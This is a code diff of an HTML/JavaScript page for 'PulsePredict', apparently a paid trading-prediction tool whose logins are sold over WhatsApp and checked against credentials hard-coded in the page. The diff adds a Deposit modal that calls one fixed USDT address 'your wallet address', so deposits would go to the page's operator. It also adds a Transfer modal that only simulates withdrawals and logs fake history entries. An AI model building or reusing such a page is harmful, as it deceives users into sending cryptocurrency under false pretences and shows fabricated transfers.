@@ -13,7 +13,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #0d47a1, #00c853);
+      background: linear-gradient(135deg, #eb0fbf, #f34018);
     }
 
     .login-container {
@@ -126,7 +126,7 @@
       If you don't have an account click the button below:
     </div>
     <button onclick="window.location.href='https://wa.me/254740491902?text=hello,%20i%27d%20like%20to%20purchase%20this%20tool'">Get Logins</button>
-    <div class="price-tag">@100$</div>
+    <div class="price-tag">@5,500kes</div>
 
     <div class="checkbox-container">
       <label>
@@ -168,7 +168,7 @@
     body {
       margin: 0;
       font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #0547c1, #09e639);
+      background: linear-gradient(135deg, #fa0ec7, #f7230f);
       color: #333;
     }
     nav {
@@ -176,9 +176,9 @@
       justify-content: space-between;
       align-items: center;
       padding: 0.8rem 1.5rem;
-      background: rgba(22, 214, 12, 0.7);
+      background: rgba(15, 108, 71, 0.7);
       backdrop-filter: blur(8px);
-      box-shadow: 0 2px 6px rgba(220, 5, 5, 0.1);
+      box-shadow: 0 2px 6px rgba(202, 250, 8, 0.1);
       position: fixed;
       top: 0;
       left: 0;
@@ -201,7 +201,7 @@
       padding: 0 1rem;
     }
     .card {
-      background: rgba(255,255,255,0.8);
+      background: rgb(68, 62, 57);
       backdrop-filter: blur(8px);
       border-radius: 16px;
       padding: 1rem;
@@ -212,7 +212,7 @@
       padding: 0.5rem 1rem; border-radius: 20px; border: 1px solid #ccc;
       cursor: pointer; transition: all 0.3s; background: white;
     }
-    .pill.active { background: #007bff; color: white; border-color: #007bff; box-shadow: 0 0 6px rgba(0,123,255,0.6); }
+    .pill.active { background: #3001d9; color: rgb(249, 5, 5); border-color: #3c02bb; box-shadow: 0 0 6px rgba(0,123,255,0.6); }
     .volatility-display { text-align: center; margin-top: 0.5rem; font-size: 1.2rem; font-weight: bold; position: relative; }
     .volatility-display::after {
       content: ''; display: block; width: 50px; height: 3px; background: #007bff;
@@ -226,8 +226,8 @@
       width: 80px;
       height: 40px;
       border-radius: 40px / 20px;
-      background: #007bff;
-      color: white;
+      background: #1500ff;
+      color: rgb(246, 250, 10);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -248,8 +248,8 @@
     }
     .digit .value { font-size: 1.2rem; font-weight: bold; }
     .digit .percent { font-size: 0.8rem; }
-    .digit.green {border-color: green; box-shadow: 0 0 8px green;}
-    .digit.pink {border-color: deeppink; box-shadow: 0 0 8px deeppink;}
+    .digit.green {border-color: rgb(11, 248, 11); box-shadow: 0 0 15px rgb(13, 252, 13);}
+    .digit.pink {border-color: deeppink; box-shadow: 0 0 15px deeppink;}
     .digit.low {border-color: red; box-shadow: 0 0 15px red;}
     .digit.highlight::before {
       content: ''; position: absolute; top: -6px; left: -6px;
@@ -264,7 +264,7 @@
       border: none; border-radius: 25px; background: #1005d5; color: white;
       font-size: 1.1rem; cursor: pointer; transition: background 0.3s;
     }
-    .match-button:hover { background: #87a407; }
+    .match-button:hover { background: #08ef23; }
     .speedbot input { width: 100px; padding: 0.3rem; border-radius: 8px; border: 1px solid #ccc; text-align: right; }
     .speedbot-row { display: flex; justify-content: space-between; margin-bottom: 0.5rem; align-items: center; }
     .run-button {
@@ -293,7 +293,7 @@
       <div class="flag-circle">
         <img src="https://flagcdn.com/w320/us.png" alt="US Flag"/>
       </div>
-      <div class="balance" id="balance">USD 11.00</div>
+      <div class="balance" id="balance">USD 0.00</div>
     </div>
   </nav>
   <main>
@@ -323,9 +323,9 @@
   </main>
   <script>
     const balanceEl = document.getElementById("balance");
-    let balance = 11.00;
+    let balance = 0.00;
 
-    const volatilityOptions = ["10 1s","15 1s","30 1s","50 1s","75 1s","90 1s","100 1s"];
+    const volatilityOptions = ["10","10s","15","15s","30","30s","50","50s","75","75s","90","90s","100","100s"];
     const volContainer = document.getElementById("volatility-options");
     const volDisplay = document.getElementById("volatility-display");
     volatilityOptions.forEach((opt,i)=>{
@@ -432,13 +432,21 @@
       document.getElementById("history").innerHTML="";
     };
   </script>
+  
+  <!-- Second page inserted verbatim inside a hidden textarea so its exact bytes are preserved.
+       We do NOT modify the second page content; it will be read and opened as a standalone HTML doc. -->
+  <textarea id="thirdPageTemplate" style="display:none;">
+    
+  
 </body>
 </html>
   </textarea>
 
   <!-- Override validateLogin to open the exact second-page HTML (preserved above) on successful login.
        We leave your original function present above (so nothing in your original code text changed),
-       but we replace it at runtime with this version so the second page opens as a standalone document. -->
+       but we replace it at runtime with this version so the second page runs as a standalone document.
+       This new override injects a decorated sidebar menu and now full Deposit/Transfer modals
+       (injected at runtime only; the preserved textarea content is not modified). -->
   <script>
     // replace the existing validateLogin function with one that opens the preserved second page
     window.validateLogin = function() {
@@ -448,7 +456,7 @@
       const error = document.getElementById("error-message");
 
       // same fixed credentials
-      const validUsername = "eratta";
+      const validUsername = "pulsetr5";
       const validPassword = "kkss.dm";
 
       if (username === validUsername && password === validPassword && agreeBox) {
@@ -459,12 +467,335 @@
         const blob = new Blob([secondHTML], { type: "text/html" });
         const url = URL.createObjectURL(blob);
 
-        // navigate current tab to the generated page
-        window.location.href = url;
+        // open in a new tab so we can inject the Menu button at runtime without changing the preserved HTML
+        const newWin = window.open(url, '_blank');
+
+        // If popup blocked or cannot open new tab, fallback to same-tab navigation
+        if (!newWin) {
+          window.location.href = url;
+          return;
+        }
+
+        // Poll until the new window's DOM is ready, then insert a decorative, icon-rich sidebar menu + modals.
+        const start = Date.now();
+        const maxWait = 7000; // ms
+        const injectInterval = setInterval(() => {
+          try {
+            const doc = newWin.document;
+            const navLeft = doc.querySelector('.nav-left');
+            if (navLeft) {
+              // --- Create Menu Button (small stylish hamburger) ---
+              const wrapper = doc.createElement('div');
+              wrapper.className = 'pp-inject-menu-wrapper';
+              const btn = doc.createElement('button');
+              btn.className = 'pp-inject-menu-btn';
+              btn.setAttribute('aria-label','Open menu');
+
+              // hamburger SVG
+              btn.innerHTML = `
+                <svg width="18" height="14" viewBox="0 0 18 14" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                  <rect y="1" width="18" height="2" rx="1" fill="#0d0d0d"/>
+                  <rect y="6" width="18" height="2" rx="1" fill="#0d0d0d"/>
+                  <rect y="11" width="18" height="2" rx="1" fill="#0d0d0d"/>
+                </svg>
+              `;
+              wrapper.appendChild(btn);
+              // insert button before nav-left text (so nav-left remains intact)
+              navLeft.insertBefore(wrapper, navLeft.firstChild);
+
+              // --- Create Sidebar & Overlay ---
+              const overlay = doc.createElement('div');
+              overlay.className = 'pp-inject-overlay';
+
+              const sidebar = doc.createElement('aside');
+              sidebar.className = 'pp-inject-sidebar';
+              sidebar.setAttribute('role','menu');
+
+              // inline SVG icons for menu items
+              const iconDeposit = `<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M12 2L12 13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 10h14v10H5z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>`;
+              const iconTransfer = `<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/><polyline points="7 10 12 5 17 10" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/><line x1="12" y1="5" x2="12" y2="19" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+              const iconHelp = `<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M9.09 9a3 3 0 1 1 5.82 1c0 1-1 1.5-1.5 2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/><path d="M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>`;
+              const iconWhatsApp = `<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M21.7 20.3l-3.6-1a8.9 8.9 0 0 1-4.1 0 8.7 8.7 0 0 1-4.8-4.8 8.9 8.9 0 0 1 0-8.2 8.9 8.9 0 0 1 8.2-4.8h.1a8.7 8.7 0 0 1 4.8 1.4 8.9 8.9 0 0 1 2.7 3.5 8.9 8.9 0 0 1 .7 4.1 8.9 8.9 0 0 1-2.8 5.9z" stroke="currentColor" stroke-width="0.9" stroke-linecap="round" stroke-linejoin="round" fill="none"/><path d="M16 12c0 .6-.7 1.2-1.2 1.4-.8.3-1.4.3-2 .1-.5-.1-1.5-.5-2.1-1" stroke="currentColor" stroke-width="0.9" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg>`;
+              const iconLogout = `<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/><polyline points="16 17 21 12 16 7" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/><line x1="21" y1="12" x2="9" y2="12" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+
+              sidebar.innerHTML = `
+                <div class="pp-inject-sidebar-header">
+                  <div class="pp-inject-title">Quick Menu</div>
+                  <button class="pp-inject-close" aria-label="Close menu">&times;</button>
+                </div>
+                <div class="pp-inject-user">
+                  <div class="pp-inject-avatar" aria-hidden="true">
+                    <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="8" r="3.2" fill="currentColor"/><path d="M4.5 20.5a7.5 7.5 0 0 1 15 0" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                  </div>
+                  <div class="pp-inject-userinfo">
+                    <div class="pp-inject-name">PulsePredict User</div>
+                    <div class="pp-inject-sub">USD Balance: <strong id="pp-balance-inject">0.00</strong></div>
+                  </div>
+                </div>
+                <nav class="pp-inject-menu">
+                  <ul>
+                    <li data-action="deposit">${iconDeposit}<span>Deposit</span></li>
+                    <li data-action="transfer">${iconTransfer}<span>Transfer</span></li>
+                    <li data-action="help">${iconHelp}<span>Help Centre</span></li>
+                    <li data-action="whatsapp">${iconWhatsApp}<span>WhatsApp</span></li>
+                    <li data-action="logout">${iconLogout}<span>Logout</span></li>
+                  </ul>
+                </nav>
+                <div class="pp-inject-footer">
+                  <a class="pp-inject-cta" href="https://wa.me/254740491902?text=hello,%20i%27d%20like%20to%20purchase%20this%20tool" target="_blank" rel="noreferrer">Get Logins</a>
+                </div>
+              `;
+
+              // Append overlay and sidebar to doc
+              doc.body.appendChild(overlay);
+              doc.body.appendChild(sidebar);
+
+              // --- Create modal overlay & modal containers (hidden initially) ---
+              const modalOverlay = doc.createElement('div');
+              modalOverlay.className = 'pp-inject-modal-overlay';
+
+              const depositModal = doc.createElement('div');
+              depositModal.className = 'pp-inject-modal pp-inject-deposit-modal';
+              depositModal.innerHTML = `
+                <button class="pp-modal-close" aria-label="Close deposit modal">&times;</button>
+                <div class="pp-modal-icon">💰</div>
+                <h3 class="pp-modal-title">Deposit</h3>
+                <div class="pp-modal-body">
+                  <p class="pp-modal-text">“This is your wallet address: <strong>TJ3xrDQSrvY4k6tSSxz9rkNArL1YsqgmrC</strong>. Deposit your funds from Binance, Bybit, or Deriv in USDT (TRC20).”</p>
+                  <div class="pp-address-row">
+                    <input readonly class="pp-address-box" id="pp-address-box" value="TJ3xrDQSrvY4k6tSSxz9rkNArL1YsqgmrC" />
+                    <button class="pp-copy-btn" id="pp-copy-btn">Copy</button>
+                  </div>
+                  <div class="pp-address-caption">Only send USDT (TRC20) to this address.</div>
+                </div>
+              `;
+
+              const transferModal = doc.createElement('div');
+              transferModal.className = 'pp-inject-modal pp-inject-transfer-modal';
+              transferModal.innerHTML = `
+                <button class="pp-modal-close" aria-label="Close transfer modal">&times;</button>
+                <div class="pp-modal-icon">🔄</div>
+                <h3 class="pp-modal-title">Go to Deriv, copy your wallet address and paste it below.</h3>
+                <div class="pp-modal-body">
+                  <label class="pp-field-label">Wallet Address</label>
+                  <input class="pp-input" id="pp-transfer-address" placeholder="Wallet Address" />
+                  <label class="pp-field-label">Amount (USDT)</label>
+                  <input type="number" min="0" step="0.01" class="pp-input" id="pp-transfer-amount" placeholder="Amount (USDT)" />
+                  <button class="pp-transfer-btn" id="pp-transfer-btn">Transfer</button>
+                  <div class="pp-address-caption">Ensure the wallet address is correct before transferring.</div>
+                </div>
+              `;
+
+              doc.body.appendChild(modalOverlay);
+              doc.body.appendChild(depositModal);
+              doc.body.appendChild(transferModal);
+
+              // --- Insert CSS (scoped prefixes to avoid collisions) ---
+              const style = doc.createElement('style');
+              style.textContent = `
+                .pp-inject-menu-wrapper { display:inline-flex; align-items:center; margin-right:10px; }
+                .pp-inject-menu-btn{ display:inline-flex; align-items:center; justify-content:center; width:40px; height:34px; border-radius:10px; border:none; background:rgba(255,255,255,0.95); cursor:pointer; box-shadow:0 3px 12px rgba(0,0,0,0.12); transition:transform .18s ease; }
+                .pp-inject-menu-btn:active{ transform:scale(.98); }
+                .pp-inject-overlay{ position:fixed; inset:0; background:rgba(0,0,0,0.28); opacity:0; pointer-events:none; transition:opacity .28s ease; z-index:1400; }
+                .pp-inject-overlay.open{ opacity:1; pointer-events:auto; }
+                .pp-inject-sidebar{ position:fixed; top:0; left:0; height:100vh; width:300px; max-width:86%; background:linear-gradient(180deg,#ffffff, #f7f7f7); box-shadow: 2px 12px 40px rgba(0,0,0,0.3); transform:translateX(-110%); transition:transform .36s cubic-bezier(.2,.9,.2,1); z-index:1500; padding:18px 14px; display:flex; flex-direction:column; gap:12px; border-top-right-radius:12px; border-bottom-right-radius:12px; color:#111; }
+                .pp-inject-sidebar.open{ transform:translateX(0); }
+                .pp-inject-sidebar-header{ display:flex; align-items:center; justify-content:space-between; gap:8px; padding-bottom:6px; border-bottom:1px solid rgba(0,0,0,0.06); }
+                .pp-inject-title{ font-weight:700; font-size:1.05rem; color:#0b6b44; }
+                .pp-inject-close{ background:transparent; border:none; font-size:1.5rem; line-height:1; cursor:pointer; color:#333; padding:4px 6px; border-radius:8px; }
+                .pp-inject-user{ display:flex; gap:10px; align-items:center; padding:8px 0; }
+                .pp-inject-avatar svg{ width:48px; height:48px; color:#0b6b44; border-radius:50%; background:linear-gradient(135deg,#e8f5e9,#b9f6ca); padding:6px; }
+                .pp-inject-name{ font-weight:700; }
+                .pp-inject-sub{ font-size:0.85rem; color:#666; margin-top:4px; }
+                .pp-inject-menu ul{ list-style:none; padding:0; margin:0; display:flex; flex-direction:column; gap:8px; }
+                .pp-inject-menu li{ display:flex; align-items:center; gap:12px; padding:10px 10px; border-radius:10px; cursor:pointer; transition:background .16s ease, transform .12s ease; color:#111; }
+                .pp-inject-menu li svg{ color:#0b6b44; min-width:20px; min-height:20px; }
+                .pp-inject-menu li:hover{ background:linear-gradient(90deg, rgba(11,107,68,0.06), rgba(11,107,68,0.02)); transform:translateX(4px); }
+                .pp-inject-menu li span{ font-weight:600; }
+                .pp-inject-footer{ margin-top:auto; padding-top:6px; border-top:1px solid rgba(0,0,0,0.04); display:flex; justify-content:center; }
+                .pp-inject-cta{ display:inline-block; background:#0b6b44; color:#fff; padding:10px 14px; border-radius:10px; text-decoration:none; font-weight:700; box-shadow:0 6px 18px rgba(11,107,68,0.14); }
+
+                /* Modal styles */
+                .pp-inject-modal-overlay{ position:fixed; inset:0; background:rgba(0,0,0,0.45); opacity:0; pointer-events:none; transition:opacity .22s ease; z-index:1600; display:flex; align-items:center; justify-content:center; padding:16px; }
+                .pp-inject-modal-overlay.open{ opacity:1; pointer-events:auto; }
+                .pp-inject-modal{ width:420px; max-width:96%; background: #fff; border-radius:12px; box-shadow:0 14px 40px rgba(0,0,0,0.25); padding:18px; transform:translateY(12px); transition:transform .24s ease, opacity .24s ease; opacity:0; z-index:1700; position:relative; }
+                .pp-inject-modal.open{ transform:translateY(0); opacity:1; }
+                .pp-modal-close{ position:absolute; top:10px; right:10px; background:transparent; border:none; font-size:20px; cursor:pointer; color:#666; }
+                .pp-modal-icon{ font-size:34px; text-align:center; margin-bottom:8px; }
+                .pp-modal-title{ text-align:center; margin:6px 0 10px; font-size:1.05rem; color:#0b6b44; }
+                .pp-modal-body{ padding:8px 6px; color:#333; font-size:0.96rem; }
+                .pp-modal-text{ margin-bottom:12px; line-height:1.35; }
+                .pp-address-row{ display:flex; gap:8px; align-items:center; }
+                .pp-address-box{ flex:1; padding:10px; border-radius:8px; border:1px solid #ddd; font-family:monospace; background:#fafafa; }
+                .pp-copy-btn{ padding:8px 12px; border-radius:8px; border:none; background:#0b6b44; color:#fff; cursor:pointer; font-weight:700; }
+                .pp-address-caption{ margin-top:8px; font-size:0.85rem; color:#666; }
+                .pp-input{ width:100%; padding:10px; margin:6px 0 10px; border-radius:8px; border:1px solid #ddd; }
+                .pp-field-label{ font-size:0.85rem; color:#444; margin-top:6px; display:block; }
+                .pp-transfer-btn{ width:100%; padding:12px; border-radius:10px; border:none; background:#0077cc; color:#fff; font-weight:700; cursor:pointer; margin-top:6px; }
+                .pp-toast{ padding:8px 10px; border-radius:8px; background:#e6f7e6; color:#066b2b; display:inline-block; margin-top:8px; font-weight:600; }
+
+                @media (max-width:520px){
+                  .pp-inject-sidebar{ width:86%; }
+                  .pp-inject-modal{ padding:14px; }
+                }
+              `;
+              doc.head.appendChild(style);
+
+              // --- Wire up interactions ---
+              const openSidebar = () => { sidebar.classList.add('open'); overlay.classList.add('open'); };
+              const closeSidebar = () => { sidebar.classList.remove('open'); overlay.classList.remove('open'); };
+
+              btn.addEventListener('click', openSidebar);
+              overlay.addEventListener('click', closeSidebar);
+              const closeBtn = sidebar.querySelector('.pp-inject-close');
+              closeBtn.addEventListener('click', closeSidebar);
+
+              // Modal control functions
+              const openModal = (modalElem) => {
+                modalOverlay.classList.add('open');
+                modalElem.classList.add('open');
+                // focus first focusable element
+                const f = modalElem.querySelector('input,button,textarea');
+                if (f) f.focus();
+              };
+              const closeModal = (modalElem) => {
+                modalOverlay.classList.remove('open');
+                modalElem.classList.remove('open');
+              };
+
+              // copy helper with fallback
+              const copyText = async (text) => {
+                try {
+                  if (doc.defaultView.navigator.clipboard && doc.defaultView.navigator.clipboard.writeText) {
+                    await doc.defaultView.navigator.clipboard.writeText(text);
+                    return true;
+                  }
+                } catch(e){}
+                // fallback (select input)
+                try {
+                  const ta = doc.createElement('textarea');
+                  ta.value = text;
+                  ta.style.position = 'fixed';
+                  ta.style.left = '-9999px';
+                  doc.body.appendChild(ta);
+                  ta.select();
+                  const ok = doc.execCommand && doc.execCommand('copy');
+                  doc.body.removeChild(ta);
+                  return !!ok;
+                } catch(e){}
+                return false;
+              };
+
+              // Buttons in deposit modal
+              const ppCopyBtn = depositModal.querySelector('#pp-copy-btn');
+              const ppAddressBox = depositModal.querySelector('#pp-address-box');
+              ppCopyBtn.addEventListener('click', async () => {
+                const val = ppAddressBox.value || 'TJ3xrDQSrvY4k6tSSxz9rkNArL1YsqgmrC';
+                const ok = await copyText(val);
+                const original = ppCopyBtn.textContent;
+                ppCopyBtn.textContent = ok ? 'Copied!' : 'Copy';
+                setTimeout(()=> { ppCopyBtn.textContent = original; }, 1400);
+              });
+
+              // Transfer modal submit
+              const ppTransferBtn = transferModal.querySelector('#pp-transfer-btn');
+              const ppTransferAddress = transferModal.querySelector('#pp-transfer-address');
+              const ppTransferAmount = transferModal.querySelector('#pp-transfer-amount');
+              ppTransferBtn.addEventListener('click', () => {
+                const addr = ppTransferAddress.value.trim();
+                const amt = parseFloat(ppTransferAmount.value);
+                if (!addr) {
+                  try { transferModal.querySelector('.pp-modal-body').appendChild(createToast('Please enter a wallet address.')); } catch(e){}
+                  return;
+                }
+                if (isNaN(amt) || amt <= 0) {
+                  try { transferModal.querySelector('.pp-modal-body').appendChild(createToast('Enter a valid amount > 0.')); } catch(e){}
+                  return;
+                }
+                // Simulate transfer success
+                try {
+                  transferModal.querySelector('.pp-modal-body').appendChild(createToast('Transfer submitted (simulated).'));
+                } catch(e){}
+                // Optionally reflect in page history if exists
+                try {
+                  const hist = doc.getElementById('history');
+                  if (hist) {
+                    const entry = new Date().toLocaleTimeString() + " | Transfer: " + amt.toFixed(2) + " USDT | Addr: " + addr;
+                    hist.innerHTML = entry + "<br>" + hist.innerHTML;
+                  }
+                } catch(e){}
+                setTimeout(()=> closeModal(transferModal), 1200);
+              });
+
+              // small toast creator
+              function createToast(text) {
+                const t = doc.createElement('div');
+                t.className = 'pp-toast';
+                t.textContent = text;
+                setTimeout(()=> { try { t.remove(); } catch(e){} }, 2800);
+                return t;
+              }
+
+              // Close buttons on modals
+              const modalCloseButtons = doc.querySelectorAll('.pp-modal-close');
+              modalCloseButtons.forEach(b => {
+                b.addEventListener('click', () => {
+                  const parent = b.closest('.pp-inject-modal');
+                  if (parent) closeModal(parent);
+                });
+              });
+
+              // Clicking outside modal on modalOverlay closes whichever modal is open
+              modalOverlay.addEventListener('click', () => {
+                [depositModal, transferModal].forEach(m => closeModal(m));
+              });
+
+              // Menu item click handling (open modals)
+              const menuItems = sidebar.querySelectorAll('.pp-inject-menu li');
+              menuItems.forEach(li=>{
+                li.addEventListener('click', (ev) => {
+                  const action = li.getAttribute('data-action');
+                  // Actions implemented without modifying preserved HTML:
+                  if(action === 'deposit') {
+                    // open deposit modal
+                    closeSidebar();
+                    setTimeout(()=> openModal(depositModal), 180);
+                  } else if(action === 'transfer') {
+                    closeSidebar();
+                    setTimeout(()=> openModal(transferModal), 180);
+                  } else if(action === 'help') {
+                    try { newWin.open('https://wa.me/254740491902?text=Hello%20Support','_blank'); } catch(e) {}
+                  } else if(action === 'whatsapp') {
+                    try { newWin.open('https://wa.me/254740491902?text=Hello%20from%20PulsePredict','_blank'); } catch(e) {}
+                  } else if(action === 'logout') {
+                    try { newWin.close(); } catch(e) { /* if cannot close, navigate to about:blank */ newWin.location.href = 'about:blank'; }
+                  }
+                });
+              });
+
+              // Attempt to sync a balance display if present in the second page
+              try {
+                const pageBalanceEl = doc.getElementById('balance');
+                const injectBalanceEl = sidebar.querySelector('#pp-balance-inject');
+                if(pageBalanceEl && injectBalanceEl) {
+                  injectBalanceEl.textContent = pageBalanceEl.textContent || '0.00';
+                }
+              } catch(e) {}
+
+              // Completed injection - stop polling
+              clearInterval(injectInterval);
+            }
+          } catch (e) {
+            // ignore until DOM is accessible
+          }
+          if (Date.now() - start > maxWait) clearInterval(injectInterval);
+        }, 160);
+
       } else {
         error.style.display = "block";
       }
     };
   </script>
+  
 </body>
 </html>
